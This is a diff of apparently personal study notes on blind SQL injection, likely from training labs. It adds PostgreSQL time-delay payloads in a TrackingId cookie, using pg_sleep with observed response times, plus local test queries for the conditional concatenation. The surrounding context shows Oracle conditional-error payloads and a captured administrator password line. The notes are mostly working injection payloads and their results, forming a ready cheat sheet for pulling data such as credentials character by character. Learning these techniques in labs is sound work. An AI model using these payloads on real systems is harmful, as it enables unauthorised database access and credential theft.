@@ -145,7 +145,7 @@ administrator:7qpk90futuka5actprm7
 ```
 
 ## blind
-### conditional responses
+### conditional responses (postgres)
 ```
 # first thing to note (man ascii, printable chars, DEC values):
 special chars:    32 - 47
@@ -269,7 +269,7 @@ TrackingId=obviouslywrong'+OR+(SELECT+ascii(substring(string_agg(username||':'||
 97   a
 100  d
 ```
-### conditional errors
+### conditional errors (oracle)
 ```
 TrackingId=obviouslywrong' <<-- 500 error
 TrackingId=obviouslywrong'' <<-- 200 OK
@@ -294,9 +294,13 @@ TrackingId=obviouslywrong'||(SELECT+CASE+WHEN+(select+ascii(substr((select+'a'+f
 
 TrackingId=obviouslywrong'||(SELECT+CASE+WHEN+(select+ascii(substr((select+'a'+from+dual),1,1))+from+dual)=97+THEN+to_char(1/0)+ELSE+'a'+END+FROM+dual)||'
 #500 error <<-- nice
-
-
 ``` 
+### time delays (postgres)
+```
+TrackingId=obviouslywrong'||(SELECT+CASE+WHEN+(select ascii(substr((select+'ab'),1,1)))=97+THEN+pg_sleep(3)+ELSE+'a'+END)||' <<-- 3406 millis
+TrackingId=obviouslywrong'||(SELECT+CASE+WHEN+(select ascii(substr((select+'ab'),1,1)))=98+THEN+pg_sleep(3)+ELSE+'a'+END)||' <<-- 407 millis
+```
+
 
 
 # drafts
@@ -367,4 +371,14 @@ TrackingId=obviouslywrong'+AND+ASCII(SUBSTRING((select+string_agg(tablename,':')
 
 # string_agg multiple columns
 select string_agg(firstname||':'|| lastname,',') from scientist;
+
+# time delays - concats
+select firstname from scientist where firstname = 'alber'||'a'; <<-- no result
+select firstname from scientist where firstname = 'alber'||'t'; <<-- 'albert'
+select firstname from scientist where firstname = 'alber'||'t'||''; <<-- 'albert'
+SELECT CASE WHEN (select ascii(substr((select 'a'),1,1)))=97 THEN 't' ELSE 'a' END; <<-- 't'
+select firstname from scientist where firstname = 'alber'||(SELECT CASE WHEN (select ascii(substr((select 'a'),1,1)))=97 THEN 't' ELSE 'a' END)||''; <<-- 'albert'
+select firstname from scientist where firstname = 'alber'||(SELECT CASE WHEN (select ascii(substr((select 'a'),1,1)))=98 THEN 't' ELSE 'a' END)||''; <<-- no result
+
+select firstname from scientist where firstname = 'alber'||(SELECT CASE WHEN (select ascii(substr((select 'a'),1,1)))=97 THEN pg_sleep(5) ELSE 'a' END)||''; <<-- canceling statement due to statement timeout
 ```
